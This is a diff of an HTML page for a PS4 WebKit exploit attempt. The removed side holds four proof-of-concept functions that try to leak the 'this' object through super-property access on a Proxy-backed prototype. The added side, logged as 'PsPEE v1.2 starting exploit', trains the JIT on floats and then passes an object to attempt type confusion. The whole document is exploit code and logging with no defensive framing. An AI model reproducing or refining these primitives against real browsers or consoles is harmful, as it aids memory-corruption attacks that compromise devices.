@@ -1,102 +1,52 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8"/>
-  <title>PS4 WebKit Leak Test</title>
-  <style>
-    body { background: #000; color: #0f0; font-family: monospace; }
-    #log { 
-      white-space: pre; 
-      padding: 1em; 
-      border: 2px solid #0f0; 
-      margin: 1em; 
-      max-height: 80vh; 
-      overflow-y: auto; 
-    }
-  </style>
+    <style>
+        #output {
+            font-family: monospace;
+            white-space: pre-wrap;
+            background-color: #000;
+            color: #0f0;
+            padding: 10px;
+            width: 100%;
+            height: 300px;
+            overflow-y: auto;
+        }
+    </style>
 </head>
 <body>
-  <div id="log">--- starting leak tests ---\n</div>
-  <script>
-    // Simple div‐based logger
-    function log(msg) {
-      const d = document.getElementById('log');
-      d.textContent += msg + '\n';
-      d.scrollTop = d.scrollHeight;
-    }
+    <div id="output"></div>
+    <script>
+        const log = msg => output.textContent += msg + "\n";
 
-    // Leak primitives from Alexey's POC
-    function tryToLeakThisViaGetById() {
-      class Leaker {
-        leak() { return super.foo; }
-      }
-      Leaker.prototype.__proto__ = new Proxy({}, {
-        get(t, p, receiver) { return receiver; }
-      });
-      const foo = 42;
-      const { leak } = Leaker.prototype;
-      return (() => leak())();
-    }
-
-    function tryToLeakThisViaGetByVal() {
-      class Leaker {
-        leak() { return super[Math.random()<0.5?"foo":"bar"]; }
-      }
-      Leaker.prototype.__proto__ = new Proxy({}, {
-        get(t, p, receiver) { return receiver; }
-      });
-      const foo = 42, bar = 84;
-      const { leak } = Leaker.prototype;
-      return (() => leak())();
-    }
-
-    function tryToLeakThisViaSetById() {
-      let receiver;
-      class Leaker {
-        leak() { super.foo = {}; return receiver; }
-      }
-      Leaker.prototype.__proto__ = new Proxy({}, {
-        set(t, p, v, __receiver) { receiver = __receiver; return true; }
-      });
-      const foo = 42;
-      const { leak } = Leaker.prototype;
-      return (() => leak())();
-    }
-
-    function tryToLeakThisViaSetByVal() {
-      let receiver;
-      class Leaker {
-        leak() { super[Math.random()<0.5?"foo":"bar"] = {}; return receiver; }
-      }
-      Leaker.prototype.__proto__ = new Proxy({}, {
-        set(t, p, v, __receiver) { receiver = __receiver; return true; }
-      });
-      const foo = 42, bar = 84;
-      const { leak } = Leaker.prototype;
-      return (() => leak())();
-    }
-
-    // Runner: loop each primitive and stop on first leak
-    function runTest(name, fn) {
-      log(`[*] Testing ${name}…`);
-      for (let i = 0; i < 100000; i++) {
-        let leaked = fn();
-        if (leaked !== undefined) {
-          log(`  [+] Leak  at iteration ${i}: ${String(leaked)}`);
-          return leaked;
+        function hex(n) {
+            return "0x" + n.toString(16).padStart(16, "0");
         }
-      }
-      log(`  [-] No leak (all returned undefined)`);
-      return undefined;
-    }
 
-    // Execute all four
-    runTest('GetById',   tryToLeakThisViaGetById);
-    runTest('GetByVal',  tryToLeakThisViaGetByVal);
-    runTest('SetById',   tryToLeakThisViaSetById);
-    runTest('SetByVal',  tryToLeakThisViaSetByVal);
+        log("[*] PsPEE v1.2 starting exploit...");
 
-    log('--- tests complete ---');
-  </script>
+        let float_arr = [1.1, 2.2, 3.3];
+        let obj_arr = [{}, {}, {}];
+
+        function confuse(o) {
+            let tmp = [1.1, 2.2, 3.3];
+            tmp[1] = o;
+            return tmp[1];
+        }
+
+        // Train JIT
+        for (let i = 0; i < 10000; i++) confuse(2.2);
+
+        // Now confuse type
+        let leak = confuse({a: 42});
+
+        log("[*] Leak result: " + leak);
+
+        if (typeof leak === "object") {
+            log("[+] SUCCESS: Type confusion achieved!");
+        } else {
+            log("[-] Still boxed float, try again or tune the value.");
+        }
+    </script>
 </body>
 </html>
